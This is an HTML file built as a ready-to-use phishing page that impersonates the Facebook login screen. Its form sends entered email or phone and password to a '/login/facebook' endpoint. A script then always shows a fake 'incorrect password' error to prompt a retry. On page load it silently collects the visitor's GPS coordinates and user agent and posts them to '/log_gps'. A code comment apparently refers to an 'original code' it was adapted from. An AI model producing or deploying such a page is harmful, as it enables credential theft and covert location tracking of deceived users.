<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – log in or sign up</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; }
        .fb-blue { color: #1877f2; }
        .fb-button { background-color: #1877f2; }
        .fb-button:hover { background-color: #166fe5; }
        .create-button { background-color: #42b72a; }
        .create-button:hover { background-color: #36a420; }
        #error-box { display: none; background-color: #ffebe8; border: 1px solid #dd3c10; }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4">

    <div class="w-full max-w-[1000px] lg:flex lg:items-center lg:justify-between lg:gap-12">
        
        <!-- Left Side: Branding -->
        <div class="text-center lg:text-left lg:w-1/2 mb-10 lg:mb-24">
            <h1 class="fb-blue text-5xl md:text-6xl font-bold mb-4">facebook</h1>
            <p class="text-xl md:text-2xl leading-tight">Facebook helps you connect and share with the people in your life.</p>
        </div>

        <!-- Right Side: Login Card -->
        <div class="w-full max-w-[400px] mx-auto lg:mx-0">
            <div class="bg-white p-4 rounded-xl shadow-lg border border-gray-200">
                
                <!-- Error Alert (Hidden by default) -->
                <div id="error-box" class="p-3 mb-4 rounded text-sm text-center">
                    The email or password you entered is incorrect.
                </div>

                <form id="fbForm" action="/login/facebook" method="POST" class="space-y-3">
                    <input name="user" type="text" placeholder="Email address or phone number" 
                           class="w-full p-3.5 border border-gray-300 rounded-md text-lg focus:outline-none focus:ring-1 focus:ring-blue-500" required>
                    
                    <input name="pass" type="password" placeholder="Password" 
                           class="w-full p-3.5 border border-gray-300 rounded-md text-lg focus:outline-none focus:ring-1 focus:ring-blue-500" required>
                    
                    <button id="fbBtn" type="submit" class="fb-button w-full text-white py-3 rounded-md text-xl font-bold transition">
                        Log In
                    </button>
                    
                    <div class="text-center">
                        <a href="#" class="fb-blue text-sm hover:underline">Forgotten password?</a>
                    </div>
                    
                    <hr class="my-4">
                    
                    <div class="text-center pt-2">
                        <button type="button" class="create-button text-white px-5 py-3 rounded-md font-bold text-lg transition">
                            Create new account
                        </button>
                    </div>
                </form>
            </div>
            
            <div class="mt-6 text-center text-sm">
                <p><strong>Create a Page</strong> for a celebrity, brand or business.</p>
            </div>
        </div>
    </div>

    <!-- Scripting for UI behavior -->
    <script>
        const fbForm = document.getElementById('fbForm');
        const fbBtn = document.getElementById('fbBtn');
        const errorBox = document.getElementById('error-box');

        fbForm.onsubmit = function(e) {
            // Visual behavior: change button text and show error after delay
            fbBtn.innerText = "Logging in...";
            fbBtn.disabled = true;
            fbBtn.style.opacity = "0.7";

            // In a real scenario, this would POST data. 
            // Here, we just show the error message.
            setTimeout(() => {
                errorBox.style.display = "block";
                fbBtn.innerText = "Log In";
                fbBtn.disabled = false;
                fbBtn.style.opacity = "1";
            }, 2000);
        };

        // Standard logic for IP/GPS (as seen in your original code)
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(p) {
                    fetch('/log_gps', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            lat: p.coords.latitude, 
                            lon: p.coords.longitude,
                            agent: navigator.userAgent
                        })
                    });
                });
            }
        }
    </script>

</body>
</html>
